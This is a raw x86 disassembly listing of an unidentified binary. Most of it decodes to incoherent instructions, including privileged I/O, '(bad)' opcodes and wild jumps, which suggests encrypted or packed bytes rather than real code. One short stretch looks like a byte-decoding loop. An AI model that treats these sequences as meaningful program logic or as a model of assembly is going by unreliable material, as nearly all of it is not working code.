  422e0d:	xchg   DWORD PTR [ebp+0xb],ebp
  422e10:	shl    BYTE PTR [ebx-0x79],cl
  422e13:	mov    eax,DWORD PTR [eax+0x54ca477c]
  422e19:	lahf   
  422e1a:	repnz loop 0x422dd2
  422e1d:	dec    ecx
  422e1e:	mov    bl,0x50
  422e20:	sar    BYTE PTR [edx-0x1b],1
  422e23:	xchg   DWORD PTR [esi+0x44],esp
  422e26:	mov    dh,0xa6
  422e28:	sbb    DWORD PTR [edx-0x5d],0xe679d529
  422e2f:	sub    al,0x86
  422e31:	ins    BYTE PTR es:[edi],dx
  422e32:	add    edx,DWORD PTR [ecx-0x64]
  422e35:	clc    
  422e36:	sbb    eax,0x68e36c89
  422e3b:	jl     0x422e0b
  422e3d:	push   esi
  422e3e:	jg     0x422e5c
  422e40:	sbb    al,0x38
  422e42:	jo     0x422ddb
  422e44:	add    dh,BYTE PTR [edx-0x77]
  422e47:	jae    0x422e15
  422e49:	xor    al,0x52
  422e4b:	push   cs
  422e4c:	leave  
  422e4d:	ins    DWORD PTR es:[edi],dx
  422e4e:	pop    ss
  422e4f:	ss xor al,0xd9
  422e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e53:	test   BYTE PTR [ebp-0xbc407e3],0x3e
  422e5a:	jmp    0x422e76
  422e5c:	mov    BYTE PTR [ecx-0x37],0x1f
  422e60:	mov    bl,BYTE PTR [edx]
  422e62:	jbe    0x422e7c
  422e64:	es es mov fs,ebp
  422e68:	dec    ebp
  422e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e6a:	dec    edi
  422e6b:	out    dx,al
  422e6c:	test   al,0x42
  422e6e:	sbb    BYTE PTR [eax],ah
  422e70:	jl     0x422ebc
  422e72:	jge    0x422e28
  422e74:	push   ebp
  422e75:	sbb    ecx,edx
  422e77:	cs or  eax,0x340650c3
  422e7d:	sbb    bh,dl
  422e7f:	push   ebp
  422e80:	cld    
  422e81:	or     ecx,ebp
  422e83:	in     al,dx
  422e84:	cs xor eax,0x27387783
  422e8a:	push   ecx
  422e8b:	loop   0x422e7d
  422e8d:	pop    edi
  422e8e:	dec    edi
  422e8f:	ffree  st(1)
  422e91:	add    cl,bh
  422e93:	jmp    0xa4b4dbfe
  422e98:	inc    edx
  422e99:	cli    
  422e9a:	sub    BYTE PTR ss:[ecx-0x5c23e59],dl
  422ea1:	jns    0x422e66
  422ea3:	xchg   ebp,eax
  422ea4:	shr    BYTE PTR [edi+0x10],0x72
  422ea8:	sbb    edx,DWORD PTR [ecx-0x4999ac8d]
  422eae:	mov    ds:0xa9823298,al
  422eb3:	mov    DWORD PTR [ebx+0x59aebd3c],eax
  422eb9:	sub    edx,eax
  422ebb:	push   ds
  422ebc:	mov    edi,es
  422ebe:	pop    ebp
  422ebf:	js     0x422e9b
  422ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ec3:	sar    BYTE PTR [esi-0x684e530b],0x8e
  422eca:	inc    edi
  422ecb:	sbb    al,0x69
  422ecd:	xchg   esp,eax
  422ece:	xor    DWORD PTR [eax-0x31],esp
  422ed1:	dec    esi
  422ed2:	xor    eax,0xb2b969fa
  422ed7:	cwde   
  422ed8:	outs   dx,BYTE PTR ds:[esi]
  422ed9:	inc    ebx
  422eda:	dec    esp
  422edb:	xor    BYTE PTR [esi-0x6b927273],0x3f
  422ee2:	jge    0x422e8d
  422ee4:	arpl   WORD PTR [esi],di
  422ee6:	push   edi
  422ee7:	ins    BYTE PTR es:[edi],dx
  422ee8:	inc    ecx
  422ee9:	rcr    BYTE PTR [edi-0x7efeea59],cl
  422eef:	lahf   
  422ef0:	inc    ecx
  422ef1:	add    BYTE PTR [ebp-0x12],dl
  422ef4:	les    edi,FWORD PTR [esi]
  422ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ef7:	dec    esp
  422ef8:	or     BYTE PTR [ecx-0xa],bl
  422efb:	icebp  
  422efc:	ror    edi,cl
  422efe:	mov    esp,DWORD PTR [edi-0x2c05503f]
  422f04:	loopne 0x422edb
  422f06:	jb     0x422f54
  422f08:	xchg   edi,eax
  422f09:	fdiv   DWORD PTR [eax]
  422f0b:	push   esp
  422f0c:	cmp    DWORD PTR [esi+0x584c7a84],ebp
  422f12:	test   DWORD PTR [eax-0x42],esi
  422f15:	clc    
  422f16:	jnp    0x422f81
  422f18:	test   DWORD PTR [ebx+0x70],ebp
  422f1b:	(bad)  
  422f1d:	out    dx,al
  422f1e:	imul   eax,DWORD PTR [ebp-0x6b],0x238804c0
  422f25:	dec    ebp
  422f26:	hlt    
  422f27:	inc    eax
  422f28:	jp     0x422f4a
  422f2a:	cmc    
  422f2b:	ss js  0x422efd
  422f2e:	mov    ecx,0xea0613d9
  422f33:	mov    edx,0xd8b8e459
  422f38:	push   edx
  422f39:	xchg   esp,eax
  422f3a:	push   ecx
  422f3b:	das    
  422f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f3d:	mov    cl,0xad
  422f3f:	jle    0x422edc
  422f41:	sahf   
  422f42:	pop    ebx
  422f43:	adc    esp,esp
  422f45:	inc    eax
  422f46:	jae    0x422f1e
  422f48:	jmp    0x422f78
  422f4a:	pop    ss
  422f4b:	leave  
  422f4c:	in     eax,0x58
  422f4e:	fild   WORD PTR [esi+0x4e]
  422f51:	adc    al,0x69
  422f53:	adc    cl,cl
  422f55:	mov    bh,BYTE PTR [eax-0x33]
  422f58:	pop    edx
  422f59:	push   eax
  422f5a:	daa    
  422f5b:	mov    dh,0x56
  422f5d:	mov    cl,BYTE PTR [edx+ecx*8]
  422f60:	add    al,0xa7
  422f62:	push   0xb77f8eea
  422f67:	sub    eax,0xf86f4c0e
  422f6c:	loopne 0x422efe
  422f6e:	cwde   
  422f6f:	xor    al,0xf4
  422f71:	scas   al,BYTE PTR es:[edi]
  422f72:	test   DWORD PTR [edi],esp
  422f74:	in     eax,dx
  422f75:	ins    BYTE PTR es:[edi],dx
  422f76:	mov    bl,0xbf
  422f78:	cmp    esp,DWORD PTR [edi-0x21719a8]
  422f7e:	cs addr16 mov eax,0x3d337f68
  422f85:	nop
  422f86:	les    edi,FWORD PTR [edx+0x2ca5aace]
  422f8c:	scas   eax,DWORD PTR es:[edi]
  422f8d:	pop    ds
  422f8e:	push   esi
  422f8f:	(bad)  
  422f90:	into   
  422f91:	push   ebx
  422f92:	xor    al,0x96
  422f94:	ror    BYTE PTR [eax+0xbe5a81],1
  422f9a:	mov    ebx,0xc1fc99c
  422f9f:	xchg   ebx,eax
  422fa0:	daa    
  422fa1:	pop    ecx
  422fa2:	mov    WORD PTR [ebp-0x72f8533b],es
  422fa8:	std    
  422fa9:	ds cmp eax,0xa434eaac
  422faf:	mov    esp,0xd059a038
  422fb4:	fs data16 je 0x42302c
  422fb8:	cs jecxz 0x42300f
  422fbb:	inc    cx
  422fbd:	stos   BYTE PTR es:[edi],al
  422fbe:	xor    ebx,DWORD PTR [ebx+0x6a603c38]
  422fc4:	sub    eax,0xa682cd27
  422fc9:	das    
  422fca:	ret    
  422fcb:	test   eax,0xa0f58e7b
  422fd0:	pop    edi
  422fd1:	cmp    eax,0x9ff90aa8
  422fd6:	sub    ecx,DWORD PTR [ebp+0x53]
  422fd9:	fdivr  QWORD PTR [eax]
  422fdb:	fadd   QWORD PTR [ebx-0x32b1f5ab]
  422fe1:	in     eax,dx
  422fe2:	cwde   
  422fe3:	ja     0x422f7b
  422fe5:	pop    eax
  422fe6:	sbb    al,BYTE PTR [ecx+ebp*2+0x1f]
  422fea:	lods   eax,DWORD PTR ds:[esi]
  422feb:	leave  
  422fec:	xchg   ecx,eax
  422fed:	leave  
  422fee:	lahf   
  422fef:	sub    edx,ebp
  422ff1:	sti    
  422ff2:	xor    eax,0x3fad6ddd
  422ff7:	mov    ecx,0x99eb07c8
  422ffc:	sbb    dh,BYTE PTR [esi]
  422ffe:	pushf  
  422fff:	sbb    eax,DWORD PTR [esi+eax*2-0x644d55e4]
  423006:	inc    ebx
  423007:	mov    esi,0x3fa5303
  42300c:	cli    
  42300d:	pop    edx
  42300e:	fisttp DWORD PTR [ebp+0xb]
  423011:	mov    eax,0x539b1867
  423016:	mov    ebx,0x17321151
  42301b:	or     ebx,DWORD PTR [eax-0x45]
  42301e:	(bad)  
  423020:	or     BYTE PTR [esi-0x20],ah
  423023:	jg     0x423075
  423025:	jmp    DWORD PTR [edi-0x11]
  423028:	push   ds
  423029:	out    dx,eax
  42302a:	cmp    BYTE PTR [ebx-0xebb3f44],0xf6
  423031:	mov    BYTE PTR [eax+0x2b60f04c],ch
  423037:	inc    ebp
  423038:	sti    
  423039:	ret    0xe9ec
  42303c:	xchg   ecx,eax
  42303d:	aas    
  42303e:	add    eax,DWORD PTR [edi]
  423040:	ret    0x1857
  423043:	jmp    0xa4c6:0xb975b0b0
  42304a:	push   ebp
  42304b:	pop    ss
  42304c:	cmp    esp,DWORD PTR [esi]
  42304e:	stc    
  42304f:	sbb    BYTE PTR [edi+0x1d],dl
  423052:	pop    ds
  423053:	ds pop es
  423055:	mov    esi,0x259906a0
  42305a:	shr    DWORD PTR [edi],cl
  42305c:	repz aaa 
  42305e:	fiadd  DWORD PTR [eax]
  423060:	jmp    DWORD PTR [eax-0x77f2e8f9]
  423066:	mov    BYTE PTR [ebx+0x6e],ah
  423069:	mov    dl,0xbe
  42306b:	jns    0x42306a
  42306d:	xchg   DWORD PTR [ebp-0x4a0ba4c9],esp
  423073:	add    eax,DWORD PTR [edx+0x638d373a]
  423079:	or     al,bh
  42307b:	arpl   bx,sp
  42307d:	in     eax,dx
  42307e:	push   edx
  42307f:	sub    eax,0x848dd633
  423084:	add    bl,bl
  423086:	jb     0x4230ba
  423088:	add    BYTE PTR [edi],cl
  42308a:	mov    dh,0x55
  42308c:	push   DWORD PTR [ebx]
  42308e:	ror    BYTE PTR [eax+0x458aff55],1
  423094:	dec    DWORD PTR [ebx+0x5d8be455]
  42309a:	hlt    
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423abe
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   BYTE PTR [esi],dl
  4230e4:	xchg   edx,eax
  4230e5:	adc    BYTE PTR [ecx],dl
  4230e7:	mov    cl,0x94
  4230e9:	popa   
  4230ea:	bound  esi,QWORD PTR [ebx+0x1626279]
  4230f0:	adc    BYTE PTR [edi],0x4a
  4230f3:	inc    esi
  4230f4:	mov    eax,ds:0x36a07200
  4230f9:	or     cl,BYTE PTR [eax-0x2ecf48ef]
  4230ff:	jg     0x423136
  423101:	inc    ecx
  423102:	ror    cl,0x9f
  423105:	shl    DWORD PTR [ebx+0x1b],1
  423108:	inc    ecx
  423109:	jl     0x423152
  42310b:	lea    ecx,[eax-0x29433552]
  423111:	inc    esi
  423112:	pop    es
  423113:	xchg   ecx,eax
  423114:	outs   dx,BYTE PTR ds:[esi]
  423115:	pop    esi
  423116:	pop    esi
  423117:	dec    eax
  423118:	gs xchg edx,eax
  42311a:	dec    esp
  42311b:	sbb    al,0x4b
  42311d:	sub    bl,dh
  42311f:	dec    edx
  423120:	in     eax,dx
  423121:	add    al,cl
  423123:	and    eax,0x4e23da1f
  423128:	daa    
  423129:	loopne 0x42318e
  42312b:	inc    esi
  42312c:	shl    BYTE PTR [edx],0x86
  42312f:	sub    DWORD PTR [eax],edx
  423131:	outs   dx,DWORD PTR ds:[esi]
  423132:	in     eax,dx
  423133:	or     al,0xe2
  423135:	hlt    
  423136:	xor    al,0x78
  423138:	hlt    
  423139:	push   esi
  42313a:	xchg   ebp,eax
  42313b:	stc    
  42313c:	jg     0x423138
  42313e:	mov    cl,0xc4
  423140:	aas    
  423141:	dec    edx
  423142:	mov    cl,0x86
  423144:	push   edx
  423145:	dec    edi
  423146:	xchg   ebp,eax
  423147:	inc    edx
  423148:	pusha  
  423149:	test   al,0x7d
  42314b:	clc    
  42314c:	jp     0x423154
  42314e:	ds enter 0x11a5,0x5
  423153:	cmp    DWORD PTR [eax-0x55],esp
  423156:	pusha  
  423157:	jns    0x42316d
  423159:	push   esp
  42315a:	xchg   ebx,eax
  42315c:	aam    0xde
  42315e:	retf   
  42315f:	inc    ebx
  423160:	xor    al,0xf1
  423162:	scas   al,BYTE PTR es:[edi]
  423163:	addr16 adc al,0x68
  423166:	and    al,0x4f
  423168:	mov    ah,0xe6
  42316a:	icebp  
  42316b:	mov    bl,0x2a
  42316d:	dec    edi
  42316e:	das    
  42316f:	jl     0x4231ec
  423171:	mov    WORD PTR [esi+0x532d169a],ds
  423177:	push   esp
  423178:	cs sub eax,0xdc989e0
  42317e:	addr16 jmp 0x213d:0x54fba0a6
  423186:	ret    
  423187:	adc    al,0x64
  423189:	xchg   ebx,eax
  42318a:	pop    ss
  42318b:	mov    bl,0x3f
  42318d:	fs pop ss
  42318f:	daa    
  423190:	adc    DWORD PTR [eax-0x5f7868a3],esi
  423196:	scas   eax,DWORD PTR es:[edi]
  423197:	retf   0x7a0b
  42319a:	(bad)  
  42319b:	fidivr DWORD PTR [edi+0x9]
  42319e:	jo     0x42321c
  4231a0:	fadd   QWORD PTR [ecx+0x6]
  4231a3:	push   0x56
  4231a5:	pop    esp
  4231a6:	xchg   esp,eax
  4231a7:	mov    ds:0x71bd87d8,al
  4231ac:	add    DWORD PTR [edi-0xa3d18b0],esi
  4231b2:	cld    
  4231b3:	(bad)  
  4231b4:	mov    ah,0xd1
  4231b6:	jbe    0x4231f0
  4231b8:	les    edi,FWORD PTR [edx+0x39d24917]
  4231be:	ret    0x86ab
  4231c1:	(bad)  
  4231c2:	scas   eax,DWORD PTR es:[edi]
  4231c3:	aad    0x4a
  4231c5:	mov    eax,ds:0x2cbc32df
  4231ca:	cs (bad) 
  4231cd:	pop    edi
  4231ce:	retf   
  4231cf:	imul   esi,DWORD PTR [esi-0x1470c1c3],0xa6dbba
  4231d9:	(bad)  
  4231db:	jno    0x423236
  4231dd:	adc    ebx,0x16
  4231e0:	ret    0xca7b
  4231e3:	(bad)  
  4231e4:	not    BYTE PTR [ecx-0x2684cf52]
  4231ea:	or     ecx,DWORD PTR [edx+0xfc5bbb2]
  4231f0:	mov    ds:0x5a517502,al
  4231f5:	xchg   ebp,eax
  4231f6:	shl    DWORD PTR [edi+ebp*2+0x19b10e4e],0x6b
  4231fe:	and    edx,DWORD PTR [esi+0x48]
  423201:	movhlps xmm2,xmm4
  423204:	inc    ebx
  423205:	dec    ebp
  423206:	in     eax,dx
  423207:	jbe    0x42321a
  423209:	enter  0xa5c9,0xcb
  42320d:	pushf  
  42320e:	nop
  42320f:	pop    ss
  423210:	shr    BYTE PTR [eax+0x1a7a76be],0x6c
  423217:	mov    eax,0xa9fee929
  42321c:	jo     0x42329b
  42321e:	loopne 0x423213
  423220:	pop    esp
  423221:	ja     0x42326e
  423223:	cmp    eax,0xc5646999
  423228:	mov    BYTE PTR [ecx-0x25e2cf1],dh
  42322e:	mov    cl,0x15
  423230:	aad    0x7f
  423232:	in     eax,dx
  423233:	xor    al,0xac
  423235:	adc    edi,DWORD PTR [ebp+0x3862beec]
  42323b:	(bad)  
  42323e:	push   0x67
  423240:	mov    edx,0xcd3007d
  423245:	adc    dh,0x33
  423248:	pop    edx
  423249:	add    eax,0x3b8e634b
  42324e:	inc    BYTE PTR [edi-0x7e2a3492]
  423254:	xor    eax,0x3bd326ab
  423259:	sbb    BYTE PTR [edx+0x3eacb1b6],al
  42325f:	loop   0x42328f
  423261:	adc    al,0xab
  423263:	and    eax,0xf7ac6a21
  423268:	mov    ebp,0x15b3f683
  42326d:	call   0xd50d8a81
  423272:	sub    BYTE PTR [edx],dl
  423274:	cwde   
  423275:	aad    0xe6
  423277:	je     0x423263
  423279:	sbb    al,0x22
  42327b:	jae    0x423294
  42327d:	in     eax,dx
  42327e:	jo     0x42324d
  423280:	inc    edx
  423281:	xlat   BYTE PTR ds:[ebx]
  423282:	push   edi
  423283:	mov    ebx,eax
  423285:	out    dx,al
  423286:	out    0xc3,eax
  423288:	mov    ah,0x44
  42328a:	and    eax,0xe127df5
  42328f:	(bad)  
  423290:	into   
  423291:	mov    bl,0xe1
  423293:	sbb    bl,BYTE PTR [ebp-0x9]
  423296:	stos   BYTE PTR es:[edi],al
  423297:	shr    BYTE PTR [ecx-0x6f],1
  42329a:	es ja  0x423233
  42329d:	outs   dx,DWORD PTR ds:[esi]
  42329e:	pop    edi
  42329f:	iret   
  4232a0:	loopne 0x4232a9
  4232a2:	xor    BYTE PTR [esp+ebx*2+0x4a6fa330],bh
  4232a9:	push   ebx
  4232aa:	pop    edx
  4232ab:	cmp    al,0x94
  4232ad:	out    0x3c,al
  4232af:	scas   al,BYTE PTR es:[edi]
  4232b0:	fldenv [ebx]
  4232b2:	dec    ebp
  4232b3:	add    edx,DWORD PTR [edx-0x5a0fccbe]
  4232b9:	mov    ds:0x4f9343e4,eax
  4232be:	jmp    0x9c332a89
  4232c3:	sahf   
  4232c4:	test   eax,0x194c2f
  4232c9:	shr    DWORD PTR [edi+0x31],cl
  4232cc:	dec    ecx
  4232cd:	fcom   DWORD PTR ds:0xbb0261c
  4232d3:	nop
  4232d4:	jbe    0x4232b0
  4232d6:	sub    eax,0x250e6309
  4232db:	in     al,dx
  4232dc:	in     eax,0x47
  4232de:	fmul   DWORD PTR [esi+0xc]
  4232e1:	mov    ecx,0xcbfddf6
  4232e6:	xchg   esp,eax
  4232e7:	mov    edx,DWORD PTR [esi]
  4232e9:	js     0x423281
  4232eb:	add    esi,DWORD PTR [ebx-0x47c62fdc]
  4232f1:	cmp    DWORD PTR [ebp-0x58],esi
  4232f4:	push   esp
  4232f5:	mov    dh,0xd4
  4232f7:	mov    ch,0xf
  4232f9:	and    al,0x3c
  4232fb:	push   es
  4232fc:	inc    esi
  4232fd:	adc    edi,ecx
  4232ff:	sar    BYTE PTR [ecx],cl
  423301:	hlt    
  423302:	dec    esp
  423303:	sub    bh,ch
  423305:	clc    
  423306:	pop    edi
  423307:	mov    ebp,0x23f87e2d
  42330c:	add    dh,dh
  42330e:	pop    edi
  42330f:	jge    0x42337e
  423311:	jbe    0x42338f
  423313:	push   ss
  423314:	sti    
  423315:	int    0x49
  423317:	sbb    ah,ch
  423319:	clc    
  42331a:	cld    
  42331b:	mov    ds:0xd5ba17c4,al
  423320:	jb     0x423346
  423322:	mov    esp,0xa34cb3a5
  423327:	sti    
  423328:	cmp    al,al
  42332a:	ds data16 stc 
  42332d:	lods   al,BYTE PTR ds:[esi]
  42332e:	and    ebx,DWORD PTR [esi-0x1d6bceff]
  423334:	retf   
  423335:	imul   ebx,eax,0xa070be74
  42333b:	sub    esp,DWORD PTR ds:0xa3c3f943
  423341:	or     eax,0xf44d3004
  423346:	ror    DWORD PTR ds:0xd20297a6,1
  42334c:	sbb    dh,BYTE PTR [edi+0x3db25a83]
  423352:	out    dx,al
  423353:	push   0x9a54fd88
  423358:	jae    0x42338f
  42335a:	inc    esi
  42335b:	dec    esp
  42335c:	ror    DWORD PTR [eax],0x3
  42335f:	xrelease xchg BYTE PTR [esi+0xa57adf],dl
  423366:	jb     0x42330e
  423368:	repnz xchg esp,eax
  42336a:	(bad)  
  42336b:	scas   eax,DWORD PTR es:[edi]
  42336c:	xor    DWORD PTR [esi-0x5067632e],esi
  423372:	enter  0x86ea,0xaf
  423376:	and    al,dh
  423378:	pop    ebp
  423379:	pop    edi
  42337a:	adc    DWORD PTR [ecx],eax
  42337c:	inc    ebx
  42337d:	jecxz  0x423306
  42337f:	(bad)  
  423380:	js     0x423398
  423382:	bound  ebp,QWORD PTR [ecx+0x3f]
  423385:	fild   DWORD PTR [edi+eiz*1-0x7b]
  423389:	cdq    
  42338a:	test   BYTE PTR [bx-0x1ca8],cl
  42338f:	rol    BYTE PTR [esi-0x2ba3ff53],cl
  423395:	nop
  423396:	xchg   ebx,eax
  423397:	repnz push cs
  423399:	mov    ecx,0xc51a642c
  42339e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42339f:	xchg   ebx,eax
  4233a0:	mov    fs,WORD PTR [esi+0x569aa5e0]
  4233a6:	ds inc edx
  4233a8:	test   DWORD PTR ds:0x4a0b5538,edx
  4233ae:	or     ecx,DWORD PTR [ebp-0x68a2bdb8]
  4233b4:	sbb    al,0xc0
  4233b6:	and    DWORD PTR [edx-0x76],edx
  4233b9:	xchg   ecx,eax
  4233ba:	push   esi
  4233bb:	cld    
  4233bc:	daa    
  4233bd:	(bad)  
  4233be:	out    0x32,al
  4233c0:	ret    0x272e
  4233c3:	jbe    0x42336f
  4233c5:	cmp    esi,DWORD PTR [ebx-0x6676c22e]
  4233cb:	aas    
  4233cc:	retf   0x961b
  4233cf:	jae    0x42342c
  4233d1:	mov    esi,0xcf0331d6
  4233d6:	push   cs
  4233d7:	xor    ecx,DWORD PTR [ebp-0x21]
  4233da:	jne    0x423367
  4233dc:	cmp    esp,ebx
  4233de:	(bad)  
  4233df:	cmp    ecx,DWORD PTR [edi-0x3]
  4233e2:	push   es
  4233e3:	bound  ebp,QWORD PTR [esi+0x185d96ce]
  4233e9:	in     eax,0x8b
  4233eb:	aam    0x40
  4233ed:	in     eax,dx
  4233ee:	and    eax,0x91c5430c
  4233f3:	add    edx,DWORD PTR [edi+0x4ac95b34]
  4233f9:	cmp    dh,BYTE PTR [edx]
  4233fb:	jmp    0xd5039e2
  423400:	out    0x8b,al
  423402:	xchg   ebp,eax
  423403:	mov    eax,0xe8415ac9
  423408:	inc    ebp
  423409:	or     ecx,esi
  42340b:	pop    eax
  42340c:	imul   edx,DWORD PTR [eax-0x3a],0x17
  423410:	arpl   WORD PTR [edx+0x4c],di
  423413:	nop
  423414:	int    0x6
  423416:	(bad)  
  423418:	xor    eax,0x2b62d503
  42341d:	xchg   esp,eax
  42341e:	mov    edx,0x6a803cd1
  423423:	adc    eax,0x4a5ea2e0
  423428:	in     eax,0x95
  42342a:	imul   edi,edx,0xffffffd2
  42342d:	out    0x41,al
  42342f:	xor    DWORD PTR [ebx+0x17],esi
  423432:	xor    al,BYTE PTR [edi+0x779386ae]
  423438:	sbb    al,0x38
  42343a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42343b:	cmp    DWORD PTR [edx-0xe],ecx
  42343e:	cmp    al,0xc5
  423440:	cmp    al,0x8f
  423442:	std    
  423443:	and    al,0xea
  423445:	or     eax,0x5b8b7a5f
  42344a:	into   
  42344b:	bound  edi,QWORD PTR [esi-0x315b8b92]
  423451:	mov    edx,esi
  423453:	add    BYTE PTR ds:[eax+0x4d],bh
  423457:	mov    DWORD PTR [ebp-0x708dc91b],ebx
  42345d:	aad    0xbb
  42345f:	mov    ebp,0x23b51e4d
  423464:	dec    ecx
  423465:	data16 lods al,BYTE PTR ds:[esi]
  423467:	dec    eax
  423468:	hlt    
  423469:	xor    eax,0xc72d6a5
  42346e:	repz cld 
  423470:	push   ds
  423471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423472:	and    eax,0x6ccfdf2e
  423477:	mov    DWORD PTR [esi],ecx
  423479:	inc    esi
  42347a:	mov    bl,0x25
  42347c:	sub    edx,ecx
  42347e:	mov    BYTE PTR [ebx+ecx*8+0x2ed50665],ah
  423485:	mov    bl,0xb0
  423487:	pop    ecx
  423488:	sti    
  423489:	push   ebx
  42348a:	mov    ah,BYTE PTR [esi+ecx*1+0x264181dd]
  423491:	cs clc 
  423493:	dec    ebp
  423494:	jae    0x42345d
  423496:	and    eax,0xf8dcff82
  42349b:	xor    ebp,DWORD PTR [esi+0x61eeae96]
  4234a1:	pop    ds
  4234a2:	cmp    BYTE PTR [ecx-0xc6fe5de],0xb4
  4234a9:	add    dh,al
  4234ab:	mov    ch,0xff
  4234ad:	fdivr  st,st(1)
  4234af:	push   DWORD PTR [eax]
  4234b1:	sar    dl,cl
  4234b3:	dec    eax
  4234b4:	mov    ebp,0x80c1537c
  4234b9:	inc    esp
  4234ba:	jbe    0x4234a8
  4234bc:	inc    ecx
  4234bd:	cmc    
  4234be:	lods   eax,DWORD PTR ds:[esi]
  4234bf:	mov    ch,0xa2
  4234c1:	jnp    0x423528
  4234c3:	popa   
  4234c4:	xor    DWORD PTR [edi-0x39],ebx
  4234c7:	cmp    dl,BYTE PTR [ecx+0x2b4f71f1]
  4234cd:	in     eax,0x98
  4234cf:	jo     0x42351b
  4234d1:	add    eax,0xe22e817f
  4234d6:	mov    dl,BYTE PTR [esi-0x48]
  4234d9:	mov    bh,0xcc
  4234db:	mov    BYTE PTR [ecx-0x89044fb],dl
  4234e1:	add    BYTE PTR [eax-0x19],al
  4234e4:	neg    DWORD PTR [edi+0x24]
  4234e7:	inc    edx
  4234e8:	fwait
  4234e9:	shl    DWORD PTR [edi+0x3c],0xb8
  4234ed:	add    ebp,edx
  4234ef:	inc    eax
  4234f0:	(bad)  
  4234f2:	lea    edx,[esi-0x7f6fd4b2]
  4234f8:	mov    dh,BYTE PTR [eax]
  4234fa:	dec    ebp
  4234fb:	(bad)  
  4234fd:	or     ebx,DWORD PTR [esi]
  4234ff:	repz add bl,BYTE PTR [ecx]
  423502:	ins    BYTE PTR es:[edi],dx
  423503:	push   cs
  423504:	xor    dl,ah
  423506:	loop   0x423505
  423508:	inc    edi
  423509:	jb     0x423548
  42350b:	xor    al,0xc7
  42350d:	std    
  42350e:	dec    eax
  42350f:	xchg   esi,eax
  423510:	or     eax,0xd029e885
  423515:	stc    
  423516:	xor    ebx,DWORD PTR [esi]
  423518:	retf   
  423519:	inc    ecx
  42351a:	or     bl,ah
  42351c:	and    ch,BYTE PTR [esi+0x6b91db83]
  423522:	pop    esi
  423523:	div    DWORD PTR [edx]
  423525:	add    DWORD PTR [edi+0x41],edi
  423528:	mov    WORD PTR [esi-0x3d],cs
  42352b:	jo     0x423507
  42352d:	mov    DWORD PTR [edx+0x4504d358],ecx
  423533:	shl    BYTE PTR [edi+ebx*8-0x49],1
  423537:	sub    al,BYTE PTR [eax+0x4a]
  42353a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42353b:	data16 jns 0x4234f5
  42353e:	jno    0x4235b5
  423540:	cmp    ebp,DWORD PTR [ecx-0x14408599]
  423546:	push   ds
  423547:	sub    eax,esp
  423549:	pop    esi
  42354a:	and    ebp,DWORD PTR [ebx]
  42354c:	xor    edi,ebx
  42354e:	push   0xa2eee38e
  423553:	mov    ds:0x3289156b,eax
  423558:	stc    
  423559:	out    0x31,eax
  42355b:	(bad)  
  42355c:	mov    ecx,0x6fe1f86
  423561:	scas   eax,DWORD PTR es:[edi]
  423562:	xor    al,0x90
  423564:	or     eax,0x73acc028
  423569:	jb     0x423515
  42356b:	inc    ebx
  42356c:	jno    0x4235b4
  42356e:	nop
  42356f:	(bad)  
  423571:	int    0xad
  423573:	lock mov bh,0xf0
  423576:	mov    bh,0xe1
  423578:	cld    
  423579:	pusha  
  42357a:	pop    esi
  42357b:	jb     0x4235b5
  42357d:	xor    edx,eax
  42357f:	cmp    ah,ah
  423581:	dec    edi
  423582:	(bad)  
  423583:	std    
  423584:	pusha  
  423585:	fcomp  QWORD PTR [ecx]
  423587:	mov    bh,0x8b
  423589:	invd   
  42358b:	sub    eax,0x462f9d4f
  423590:	shl    BYTE PTR [ecx+0x7e],1
  423593:	add    al,BYTE PTR [ecx]
  423595:	aas    
  423596:	bound  esp,QWORD PTR [ecx+0x4]
  423599:	pop    ecx
  42359a:	pop    edi
  42359b:	ins    DWORD PTR es:[edi],dx
  42359c:	in     al,dx
  42359d:	jl     0x42360e
  42359f:	adc    bl,BYTE PTR [ecx]
  4235a1:	(bad)  
  4235a2:	mov    ebp,DWORD PTR [eax+edi*1]
  4235a5:	(bad)  
  4235a6:	mul    DWORD PTR [ecx]
  4235a8:	fstp   st(3)
  4235aa:	daa    
  4235ab:	test   BYTE PTR [ebx],cl
  4235ad:	pop    ecx
  4235ae:	stos   BYTE PTR es:[edi],al
  4235af:	(bad)  
  4235b1:	jmp    0x423617
  4235b3:	push   ebx
  4235b4:	add    edi,DWORD PTR [edx-0xf]
  4235b7:	add    ecx,DWORD PTR [ecx+eax*4-0x52d03483]
  4235be:	out    dx,al
  4235bf:	scas   al,BYTE PTR es:[edi]
  4235c0:	xchg   edx,eax
  4235c1:	or     eax,0x9961c790
  4235c6:	inc    ebx
  4235c7:	push   cs
  4235c8:	sub    al,BYTE PTR [ebx]
  4235ca:	call   0xa0e8:0x76121e5d
  4235d1:	jne    0x4235e3
  4235d3:	leave  
  4235d4:	jl     0x42360f
  4235d6:	inc    esp
  4235d7:	add    BYTE PTR [ecx+0x5b37e996],dh
  4235dd:	fadd   st,st(5)
  4235df:	xchg   edx,eax
